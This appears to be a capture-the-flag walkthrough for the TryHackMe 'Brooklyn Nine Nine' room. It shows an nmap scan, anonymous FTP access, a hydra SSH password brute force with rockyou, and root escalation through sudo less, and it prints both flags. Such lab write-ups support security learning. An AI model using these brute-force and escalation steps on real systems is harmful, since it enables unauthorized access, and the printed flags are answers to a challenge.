[Brooklyn99](https://tryhackme.com/room/brooklynninenine)

**nmap** reveals
- 21/tcp ftp
- 22/tcp ssh
- 80/tcp http
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares]
└─$ sudo nmap -O -sV -vv -A 10.10.226.25
```
**enumeration** of ftp port 21
- discovered ftp is anonymous only
- exploited ftp through anonymous/no password 
- get 'note_to_jake.txt'
```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.226.25
Connected to 10.10.226.25.
220 (vsFTPd 3.0.3)
Name (10.10.226.25:kali): admin
530 This FTP server is anonymous only.
ftp: Login failed
ftp> 
ftp> exit
221 Goodbye.
                                                                                                 
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.226.25
Connected to 10.10.226.25.
220 (vsFTPd 3.0.3)
Name (10.10.226.25:kali): anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||18509|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||28731|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |****************************************************|   119        1.82 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.69 KiB/s)
```
**cat** note_to_jake reveals that jake is a user and has a password
- may also be able to assume that holt and amy have accounts also
```bash
┌──(kali㉿kali)-[~]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
running hydra on jake with the info that he has a weak password
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares]
└─$ hydra -l jake -P /opt/rockyou.txt 10.10.226.25 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-29 10:45:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.226.25:22/
[22][ssh] host: 10.10.226.25   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-29 10:45:55
```
**Log in** with jake using password 987654321 from hydra scan
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares]
└─$ ssh jake@10.10.226.25               
jake@10.10.226.25's password: 
Permission denied, please try again.
jake@10.10.226.25's password: 
Last login: Tue May 26 08:56:58 2020
```
nothing found in jake folders
running sudo -l for incorrectly setuid permissions via GTFO bins 
```bash
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ sudo less /etc/profile
# whoami
root
```
searching holt directory we find user.txt
```bash
root@brookly_nine_nine:/home# cd holt
root@brookly_nine_nine:/home/holt# ls
nano.save  user.txt
root@brookly_nine_nine:/home/holt# cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```
searching root directrory we find 
```bash
root@brookly_nine_nine:/root# cat root.txt 
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!

```










